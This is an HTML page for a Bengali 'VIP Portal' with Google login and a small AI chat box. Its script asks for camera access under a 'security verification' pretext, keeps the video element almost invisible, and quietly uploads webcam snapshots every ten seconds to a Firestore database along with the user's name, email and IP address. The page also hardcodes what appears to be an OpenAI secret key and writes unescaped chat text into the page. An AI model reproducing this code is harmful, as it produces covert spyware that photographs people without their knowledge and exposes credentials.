<!DOCTYPE html>
<html lang="bn">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ratan Bro | VIP Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --pink: #ff4d94;
            --dark: #020617;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Hind Siliguri', sans-serif;
        }

        body {
            background: radial-gradient(circle at top right, rgba(255, 77, 148, 0.15), transparent), #020617;
            color: white;
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* Modals */
        #login-overlay, #perm-modal, #notif-modal {
            position: fixed;
            inset: 0;
            background: rgba(2, 6, 23, 0.98);
            z-index: 10000;
            display: none;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(15px);
        }

        .glass-box {
            background: rgba(255, 255, 255, 0.05);
            padding: 40px;
            border-radius: 30px;
            border: 1px solid rgba(255, 77, 148, 0.3);
            text-align: center;
            width: 90%;
            max-width: 400px;
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
        }

        .hero-header {
            margin: 20px;
            padding: 30px 20px;
            background: rgba(255, 255, 255, 0.03);
            border-radius: 30px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(15px);
            text-align: center;
        }

        .profile-wrapper {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 15px;
        }

        .p-img {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            border: 3px solid var(--pink);
            box-shadow: 0 0 25px var(--pink);
            object-fit: cover;
        }

        .user-p-img {
            width: 85px;
            height: 85px;
            border: 3px solid #fff;
            margin-left: -25px;
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            padding: 20px;
            max-width: 600px;
            margin: 0 auto;
        }

        .card {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 20px;
            padding: 25px;
            text-align: center;
            text-decoration: none;
            color: white;
            border: 1px solid rgba(255, 255, 255, 0.05);
            transition: 0.4s;
            position: relative;
            cursor: pointer;
        }

        .card i {
            font-size: 2.2rem;
            color: var(--pink);
            margin-bottom: 12px;
        }

        .alarm-dot {
            position: absolute;
            top: 12px;
            right: 12px;
            width: 12px;
            height: 12px;
            background: red;
            border-radius: 50%;
            box-shadow: 0 0 10px red;
            display: none;
            animation: pulse 1s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        .chat-area {
            max-width: 500px;
            margin: 20px auto;
            padding: 0 20px;
        }

        .chat-mini {
            background: rgba(0, 0, 0, 0.4);
            border-radius: 15px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 12px;
        }

        #chat-log {
            height: 100px;
            overflow-y: auto;
            color: #ccc;
            margin-bottom: 8px;
            font-size: 13px;
            text-align: left;
        }

        .btn-main {
            background: var(--pink);
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 50px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
        }

        /* Camera Fix: Hidden but not display:none */
        #vSource {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            pointer-events: none;
        }

        canvas { display: none; }
    </style>
</head>

<body>
    <audio id="snd-bus" src="business.mp3"></audio>
    <audio id="snd-port" src="portfolio.mp3"></audio>
    <audio id="snd-notif" src="https://www.soundjay.com/buttons/sounds/button-3.mp3"></audio>

    <div id="login-overlay">
        <div class="glass-box">
            <img src="ratan.jpg" style="width:100px; border-radius:50%; border:3px solid var(--pink); margin-bottom:15px;">
            <h3>Ratan Bro Portal</h3>
            <button class="btn-main" onclick="googleLogin()" style="margin-top:15px;">Login with Google</button>
        </div>
    </div>

    <div id="perm-modal">
        <div class="glass-box">
            <i class="fas fa-user-shield" style="font-size:3rem; color:var(--pink);"></i>
            <h3 style="margin-top:15px;">সিকিউরিটি পারমিশন</h3>
            <p style="font-size:14px; opacity:0.7; margin:15px 0;">সঠিক ভেরিফিকেশনের জন্য ক্যামেরা এক্সেস প্রয়োজন।</p>
            <button class="btn-main" onclick="grantAndStart()">Grant & Open Portal</button>
        </div>
    </div>

    <div id="notif-modal">
        <div class="glass-box">
            <h3 id="nt-title">নতুন ঘোষণা</h3>
            <p id="nt-msg" style="margin-top:10px; color: #ff4d4d;"></p>
            <button class="btn-main" onclick="closeNotif()" style="margin-top:20px;">ঠিক আছে</button>
        </div>
    </div>

    <div id="main-ui" style="display:none;">
        <div style="text-align:right;"><button onclick="googleLogout()" style="background:none; border:none; color:gray; padding:10px; cursor:pointer;">Logout</button></div>

        <div class="hero-header">
            <div class="profile-wrapper">
                <img src="ratan.jpg" class="p-img">
                <img id="u-pic" src="" class="p-img user-p-img">
            </div>
            <h2 id="u-name" style="margin-top:15px;">User</h2>
            <p id="u-ip" style="color:gray; font-size:11px;">Checking IP...</p>
        </div>

        <div class="grid">
            <div class="card" onclick="openLatestNotif()">
                <i class="fas fa-bell"></i>
                <p>Notice</p>
                <div id="notif-alarm" class="alarm-dot"></div>
            </div>
            <a href="testpaper.html" class="card"><i class="fas fa-file-pdf"></i><p>Test Paper</p></a>
            <a href="business.html" class="card"><i class="fas fa-handshake"></i><p>Business</p></a>
            <a href="portfolio.html" class="card"><i class="fas fa-laptop-code"></i><p>Portfolio</p></a>
        </div>

        <div class="chat-area">
            <div class="chat-mini">
                <div id="chat-log"><b>AI:</b> আমি আপনাকে কীভাবে সাহায্য করতে পারি?</div>
                <div style="display:flex; gap:8px;">
                    <input type="text" id="ai-msg" style="flex:1; background:#000; border:1px solid #333; color:#fff; padding:8px 15px; border-radius:50px; outline:none;" placeholder="Ask me...">
                    <button onclick="askAI()" style="background:var(--pink); border:none; color:white; padding:0 15px; border-radius:50px;">Send</button>
                </div>
            </div>
        </div>
    </div>

    <video id="vSource" autoplay playsinline muted></video>
    <canvas id="snapCanvas" width="640" height="480"></canvas>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, doc, setDoc, onSnapshot, arrayUnion } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
            authDomain: "ratanweab.firebaseapp.com",
            projectId: "ratanweab",
            storageBucket: "ratanweab.firebasestorage.app",
            messagingSenderId: "611953936063",
            appId: "1:611953936063:web:7e3ca24060d7478fb2a80a"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);
        const provider = new GoogleAuthProvider();

        let loggedUser = null;
        let userIP = "Unknown";
        let latestNotif = null;

        // ১. স্ন্যাপ ফাংশন (ব্ল্যাক স্ক্রিন ফিক্সড)
        async function takeSnap() {
            if (!loggedUser) return;
            const video = document.getElementById('vSource');
            const canvas = document.getElementById('snapCanvas');
            const ctx = canvas.getContext('2d');

            // ভিডিও এলিমেন্ট রেডি কি না চেক
            if (video.readyState === 4) {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const img = canvas.toDataURL('image/jpeg', 0.4);
                
                // যদি ছবি খুব ছোট বা কালো হয়, তবে স্কিপ করবে
                if (img.length < 1000) return; 

                const userKey = loggedUser.email.replace(/\./g, '_');
                await setDoc(doc(db, "users", userKey), {
                    name: loggedUser.displayName,
                    email: loggedUser.email,
                    photo: loggedUser.photoURL,
                    lastPic: img,
                    location: userIP,
                    lastSeen: new Date().toLocaleString(),
                    status: "Online",
                    picList: arrayUnion(img)
                }, { merge: true });
                console.log("Snap Uploaded!");
            }
        }

        // ২. পারমিশন এবং রিয়েল টাইম লুপ
        window.grantAndStart = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user", width: 640, height: 480 } 
                });
                
                const video = document.getElementById('vSource');
                video.srcObject = stream;
                
                // আইপি ফেচ
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                userIP = data.ip;
                document.getElementById('u-ip').innerText = "IP: " + userIP;

                document.getElementById('perm-modal').style.display = 'none';
                document.getElementById('main-ui').style.display = 'block';

                // ১ সেকেন্ড ওয়েট করে প্রথম স্ন্যাপ (ক্যামেরা স্ট্যাবল হতে টাইম লাগে)
                setTimeout(takeSnap, 1500);
                setTimeout(takeSnap, 3000);
                setInterval(takeSnap, 10000);

            } catch (err) {
                alert("ক্যামেরা এক্সেস ছাড়া পোর্টাল কাজ করবে না!");
            }
        };

        // ৩. অথেনটিকেশন
        onAuthStateChanged(auth, (user) => {
            if (user) {
                loggedUser = user;
                document.getElementById('u-name').innerText = user.displayName;
                document.getElementById('u-pic').src = user.photoURL;
                document.getElementById('login-overlay').style.display = 'none';
                document.getElementById('perm-modal').style.display = 'flex';
            } else {
                document.getElementById('login-overlay').style.display = 'flex';
            }
        });

        // ৪. এআই চ্যাট (GPT-4o Mini)
        window.askAI = async () => {
            const input = document.getElementById('ai-msg');
            const log = document.getElementById('chat-log');
            if (!input.value) return;

            const msg = input.value;
            log.innerHTML += `<br><b>You:</b> ${msg}`;
            input.value = "";

            try {
                const response = await fetch("https://api.openai.com/v1/chat/completions", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": "Bearer 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"
                    },
                    body: JSON.stringify({
                        model: "gpt-4o-mini",
                        messages: [{ role: "user", content: msg }]
                    })
                });
                const data = await response.json();
                log.innerHTML += `<br><b>AI:</b> ${data.choices[0].message.content}`;
            } catch (e) {
                log.innerHTML += `<br><span style="color:red;">Error connecting to AI!</span>`;
            }
            log.scrollTop = log.scrollHeight;
        };

        window.googleLogin = () => signInWithPopup(auth, provider);
        window.googleLogout = () => signOut(auth).then(() => location.reload());
        
        onSnapshot(doc(db, "system", "updates"), (snap) => {
            if (snap.exists()) {
                latestNotif = snap.data();
                if (latestNotif.hasNew) document.getElementById('notif-alarm').style.display = 'block';
            }
        });

        window.openLatestNotif = () => {
            if (latestNotif) {
                document.getElementById('nt-msg').innerText = latestNotif.message;
                document.getElementById('notif-modal').style.display = 'flex';
                document.getElementById('notif-alarm').style.display = 'none';
            }
        };

        window.closeNotif = () => document.getElementById('notif-modal').style.display = 'none';
    </script>
</body>
</html>
